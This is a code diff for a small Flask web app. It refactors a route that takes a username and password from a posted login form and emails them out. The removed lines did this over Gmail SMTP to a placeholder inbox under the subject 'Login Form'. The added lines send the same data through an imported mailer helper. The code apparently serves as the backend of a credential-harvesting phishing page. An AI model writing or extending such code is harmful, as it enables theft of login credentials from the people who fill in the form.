@@ -1,5 +1,5 @@
 from flask import Flask, render_template, request, jsonify
-import smtplib
+from mailer import send_email
 
 app = Flask(__name__)
 
@@ -9,31 +9,15 @@ def home():
 
 
 @app.route("/send-email", methods=["POST"])
-def send_email():
+def send():
     data = request.json
 
     username = data.get("username")
     password = data.get("password")
 
-    message = f"Username: {username}\nPassword: {password}"
-
-    sender_email = "YOUR_EMAIL@gmail.com"
-    receiver_email = "YOUR_EMAIL@gmail.com"
-    app_password = "YOUR_APP_PASSWORD"
-
     try:
-        with smtplib.SMTP("smtp.gmail.com", 587) as server:
-            server.starttls()
-            server.login(sender_email, app_password)
-
-            server.sendmail(
-                sender_email,
-                receiver_email,
-                f"Subject: Login Form\n\n{message}"
-            )
-
-        return jsonify({"message": "Email sent successfully!"})
-
+        send_email(username, password)
+        return jsonify({"message": "Email sent!"})
     except Exception as e:
         print(e)
         return jsonify({"message": "Failed to send email"}), 500
